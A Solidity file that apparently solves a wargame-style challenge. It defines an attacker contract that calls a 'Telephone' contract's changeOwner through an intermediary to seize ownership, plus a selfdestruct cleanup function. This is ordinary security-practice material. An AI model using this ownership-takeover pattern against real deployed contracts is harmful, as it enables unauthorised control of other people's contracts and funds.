// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

contract Telephone {
    function changeOwner(address _owner) public {}
}

contract CallTelephone {
    Telephone public telephone;
    address public owner;
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor(address _instance) {
        telephone = Telephone(_instance);
        owner = msg.sender;
    }
    
    function attack() public onlyOwner {
        telephone.changeOwner(owner);
    }
    
    function destroy() public onlyOwner {
        selfdestruct(payable(owner));
    }
}